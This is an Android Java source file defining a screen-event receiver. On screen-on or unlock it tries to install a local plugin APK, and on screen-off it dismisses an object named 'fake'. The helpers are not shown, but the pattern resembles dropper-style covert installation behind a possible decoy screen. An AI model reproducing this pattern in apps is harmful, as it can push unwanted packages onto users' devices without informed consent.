package com.xstd.qm.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.qm.Config;
import com.xstd.qm.UtilOperator;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-15
 * Time: PM2:41
 * To change this template use File | Settings | File Templates.
 */
public class ScreenBroadcastReceiver extends BroadcastReceiver {

    public void onReceive(Context context, Intent intent) {
        Config.LOGD("<<<< [[ScreenBroadcastReceiver::onReceive]] >>>>>");
        if (intent != null
                && intent.getAction() != null
                && (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)
                    || intent.getAction().equals(Intent.ACTION_SCREEN_ON)
                    || intent.getAction().equals(Intent.ACTION_USER_PRESENT))) {
            if (intent.getAction().equals(Intent.ACTION_SCREEN_ON)
                || intent.getAction().equals(Intent.ACTION_USER_PRESENT)) {
                Config.LOGD("<<<< " + intent.getAction() + " >>>>>"
                                + " function screen status : " + UtilsRuntime.isScreenLocked(context));
                //try to install
                if (UtilOperator.isPluginApkExist()
                        && !UtilsRuntime.isPackageHasInstalled(context, Config.PLUGIN_PACKAGE_NAME)) {
                    UtilOperator.tryToInstallPluginLocal(context);
                }
            } else if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
                Config.LOGD("<<<< " + Intent.ACTION_SCREEN_OFF + " >>>>>"
                                + " function screen status : " + UtilsRuntime.isScreenLocked(context));
                UtilOperator.fake.dismiss();
            }
        }
    }

}
